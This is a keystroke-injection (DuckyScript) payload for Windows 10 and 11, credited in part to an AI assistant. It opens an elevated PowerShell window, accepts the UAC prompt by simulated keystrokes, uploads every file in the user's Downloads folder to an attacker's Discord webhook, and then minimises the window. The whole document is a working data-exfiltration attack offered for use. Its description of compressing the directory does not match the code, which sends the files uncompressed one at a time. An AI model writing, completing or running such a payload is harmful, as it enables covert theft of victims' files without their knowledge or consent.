REM Title: Discord Exfil - Local Edition
REM Author: wino_willy and Gemini
REM Targets: Windows 10, 11
REM Description: This is a simple payload that should compress a directory and shoot it out to your discord.


DELAY 100

REM Open PS with Admin rights.

GUI r
DELAY 1000
STRING powershell
DELAY 1000
CTRL SHIFT ENTER
DELAY 1000
TAB
DELAY 150
TAB
DELAY 150
ENTER

# Make a ZIP archive. Then shoot it to Discord.

DELAY 1000
STRING Get-ChildItem -Path "$env:USERPROFILE\Downloads\*" | ForEach-Object { $webhookUrl = "<Discord Web-Hook Here>"; $boundary = [Guid]::NewGuid().ToString().Replace("-",""); $contentType = "multipart/form-data; boundary=$boundary"; $filename = $_.Name; $filepath = $_.FullName; $body = "--$boundary`r`nContent-Disposition: form-data; name=`"payload_json`"`r`n`r`n{`"content`":`"Sending file: $($filename)`"}`r`n--$boundary`r`nContent-Disposition: form-data; name=`"file1`"; filename=`"$filename`"`r`n`r`n" + [System.IO.File]::ReadAllBytes($filepath) + "`r`n--$boundary--`r`n"; Invoke-WebRequest -Uri $webhookUrl -Method Post -ContentType $contentType -Body $body; Write-Host "Sent file: $($_.Name)" }
DELAY 100
ENTER


# Minimize the window.
GUI DOWN
GUI DOWN